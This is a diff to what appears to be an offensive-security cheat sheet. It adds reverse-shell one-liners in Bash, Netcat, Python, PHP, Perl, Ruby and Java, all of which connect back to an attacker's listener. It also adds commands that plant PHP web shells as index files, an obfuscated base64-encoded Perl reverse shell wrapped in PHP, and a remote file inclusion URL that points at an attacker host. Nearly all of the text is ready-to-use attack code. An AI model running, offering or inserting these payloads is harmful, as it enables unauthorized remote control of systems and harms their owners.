@@ -200,8 +200,45 @@ http://target.com/?page=http://attackerIP/evil.txt%00
 **-Netcat** <br />
 ```sh 
 Target : 
-bash -i >& /dev/tcp/192.168.1.69/443 0>&1 
-nc -e /bin/sh 10.0.0.1 1234
-//without -e : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+bash -i >& /dev/tcp/192.*.*.*/* 0>&1 
+nc -e /bin/sh 10.0.0.* 1234
+//without -e : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.* 1234 >/tmp/f
 Attacker : nc -nlvp 443
+```
+
+**-Python** <br />
+```sh 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.*"",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'
+```
+
+**-PHP** <br />
+```sh 
+php -r '$sock=fsockopen(""10.0.0.*"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");' 
+//creating webshell php
+echo '<?php echo shell_exec(""/bin/nc -nvv 10.*.*.* 443 -e /bin/sh"") ?>' > index1.php
+echo '<?php $sock=fsockopen(""10.*.*.*"",443);exec(""/bin/sh -i <&3 >&3 1>&3"");?>' > index2.php
+echo '<?php echo shell_exec(""/bin/bash -i > /dev/tcp/10.11.0.42/443 0<&1 2>&1"");?>' > index3.php
+```
+
+
+**-Perl** <br />
+```sh 
+perl -e 'use Socket;$i="10.0.0.*";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+Perl script base64 encoded inside php 
+```sh 
+<?phpshell_exec(base64_decode("cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTEuMC4zNyI7JHA9MTIzNDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn"))?>
+```
+
+**-Ruby** <br />
+```sh 
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.*",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+**-Java** <br />
+```sh 
+r = Runtime.getRuntime()
+p = r.exec([""/bin/bash"",""-c"",""exec 5<>/dev/tcp/10.0.0.*/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done""] as String[])
+p.waitFor()"
 ```
